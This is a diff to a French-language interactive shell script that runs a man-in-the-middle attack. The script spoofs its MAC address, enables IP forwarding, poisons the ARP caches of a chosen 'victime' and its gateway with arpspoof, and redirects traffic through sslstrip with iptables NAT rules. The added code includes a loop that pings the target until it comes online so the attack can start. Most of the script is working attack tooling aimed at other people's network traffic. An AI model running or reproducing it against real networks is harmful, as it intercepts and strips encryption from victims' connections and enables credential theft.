@@ -5,7 +5,6 @@ clear
 
 echo "Voulez vous dissimuler votre adresse mac?"
 read repmac
-
 #-----------------------Propostition changement adresse mac--------------
 if [ $repmac = "oui" ]
 	then
@@ -21,6 +20,9 @@ if [ $repmac = "oui" ]
 		sleep 1
 		clear
 fi
+
+
+
 #--------------Début verification que l'utilisateur est root-------------
 check_root=$(id -u)
 if [ $check_root -eq 0 ]
@@ -63,7 +65,8 @@ if [ `echo $?` -ne 0 ]
 		echo "arpspoof installé"
 fi
 #macchanger
-which macchanger 1 >/dev/null
+
+which macchanger 1>/dev/null
 if [ `echo $?` -ne 0 ]
 	then
 		clear
@@ -122,12 +125,10 @@ iptab(){
 #if [ -z $1 ] 
 if [ $1 -eq 0 ]
 	then
-		echo "check 1"
 		echo " " 
 		echo "Redirection générées par le programme: "
 		iptr="Pas de redirections"
 	else
-		echo "check2"
 		iptr=$(iptables -t nat -L --line-numbers| grep REDIRECT | grep -w "$1")
 		iptd=$(iptables -t nat -L --line-numbers| grep REDIRECT | grep -w "$1" | awk '{print $1}')
 fi
@@ -154,6 +155,39 @@ if [ $1 -eq 1 ]
 fi 
 }
 
+surveillance(){
+checkboucle=0
+while [ $checkboucle -eq "0" ]
+	do
+		date=`date | cut -d "(" -f 1`
+		checkping=`ping -w 1 -c 2 $1`
+		if [ `echo $?` -eq "1" ]
+			then
+				clear
+				echo " "
+				echo "Attente de la connexion de la cible --> \033[0;32m $date\033[0m"
+				sleep 1
+			else
+				clear
+				echo "Cible connecté"
+				sleep 1
+				checkboucle=1
+		fi
+		sleep 1
+	done
+}
+
+resume(){
+if [ -z $1 ] || [ -z $2 ]
+	then
+		echo "Ip cible:  "
+		echo "Passerelle: "
+	else
+		echo "Ip cible: \033[0;32m$1\033[0m  "
+	        echo "Passerelle: \033[0;32m $2\033[0m"
+fi
+}
+
 #----------------------------------Check terminé début du programme-----------------------------------
 sortie=0
 while [ $sortie -eq "0" ]
@@ -164,6 +198,7 @@ while [ $sortie -eq "0" ]
 		iptab $port 
 		echo $iptr
 		echo " "
+		resume $vict $passerelle
 		echo " "
 		echo "===========================MENU==========================="
 		echo "1. Lancer l'attaque MITM"
@@ -180,16 +215,27 @@ while [ $sortie -eq "0" ]
 			        		clear
 						echo "Entrez l'adresse ip de la victime:"
 						read vict
+						clear
 						echo " "
 						echo "Entrez l'adresse ip de la passerelle"
 						read passerelle
+						clear
 						echo " " 
 						echo "Entrez le port d'écoute de sslstrip"
 						read port
+						clear
 						echo " "
 						echo "Quel interface souhaitez vous utiliser?:"
 						ifconfig | cut -d " " -f 1 | sed '/^$/d' 
 						read iface
+						clear
+						echo " "
+						echo "Voulez vous mettre la cible sous surveillance (la machine doit répondre au ping)?"
+						read survey
+						if [ $survey = "oui" ]
+							then 
+								surveillance $vict 
+						fi
 						macc $mac
 						echo 1 > /proc/sys/net/ipv4/ip_forward &
 						##mise en place de l'écoute en local
@@ -200,13 +246,16 @@ while [ $sortie -eq "0" ]
 						arpspoof -i $iface -t $passerelle $vict 2> /dev/null &
 						arpspoof -i $iface -t $vict $passerelle 2> /dev/null &
 						clear
+						resume $vict $passerelle
 						echo "\033[0;32mL'attaque est en cours\033[0m"
 						sleep 2
+						
 					else
 						clear
 						echo "\033[0;31mL'attaque est déjà lancée\033[0m"
 						sleep 2
 				fi
+				
 					;;
 			"2")
 				clear
@@ -245,7 +294,9 @@ while [ $sortie -eq "0" ]
 						iptables -t nat -D PREROUTING $iptd 
 						echo " arpspoof & ssltrip: arrêt en cours, veuillez patienter"
 						sleep 2  
-		                                clear    
+		                                clear  
+		                                vict=" "
+		                                passerelle=" " 
 		                                echo "\033[0;32mAttaque Stoppée\033[0m"
 		                                sleep 2
 		                                                                                                                                                                                                                                                                                                
